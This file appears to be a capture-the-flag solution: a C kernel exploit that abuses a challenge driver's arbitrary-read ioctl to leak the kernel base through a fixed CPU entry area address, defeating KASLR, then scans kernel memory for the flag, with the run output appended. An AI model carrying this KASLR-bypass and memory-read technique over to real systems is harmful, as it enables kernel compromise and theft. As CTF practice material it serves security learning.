#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>

typedef struct request_s {
    uint64_t kptr;
    uint8_t buf[256];
} request_t;

int main()
{
    request_t req = {0};
    uint64_t kernel_text = 0;
    uint64_t offt = 0;

    int fd = open("/dev/window", O_RDWR);
    if (fd < 0) {
        return -1;
    }

    req.kptr = 0xfffffe0000002f50; 
    if (ioctl(fd, 0x1337, &req)) {
        return -1;
    }

    kernel_text =  ((uint64_t* )req.buf)[0] - 0x1000b59;
    printf("[!] kernel .text found at %lx\n", kernel_text);
    printf("[!] flag at %lx\n", kernel_text + 0x2c3b000);

    while (1) {
        req.kptr = kernel_text + 0x2c00000 + offt;
        if (ioctl(fd, 0x1337, &req)) {
            return -1;
        }

        for (size_t i = 0; i < 0x100; i += 4) {
            if (!memcmp(req.buf+i, "ictf", 4)) {
                printf("flag: %s\n", (char* )(req.buf+i));
            }
        }

        offt += 0x100;
    }

    close(fd);
    return 0;
}

/*
mount: mounting host0 on /tmp/mount failed: No such device

Boot time: 3.65

---------------------------------------------------------------
                     _                            
                    | |                           
       __      _____| | ___ ___  _ __ ___   ___   
       \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \  
        \ V  V /  __/ | (_| (_) | | | | | |  __/_ 
         \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_)
                                            
  Take the opportunity. Look through the window. Get the flag.
---------------------------------------------------------------
/ $ ls
ls
bin       etc       home      proc      sbin      usr
chall.ko  exploit   init      root      sys       var
dev       flag.txt  linuxrc   run       tmp
/ $ ./exploit
./exploit
[!] kernel .text found at ffffffff9d800000
[!] flag at ffffffffa043b000
flag: ictf{th3_real_flag_was_the_f4ke_st4ck_canaries_we_met_al0ng_the_way}
*/
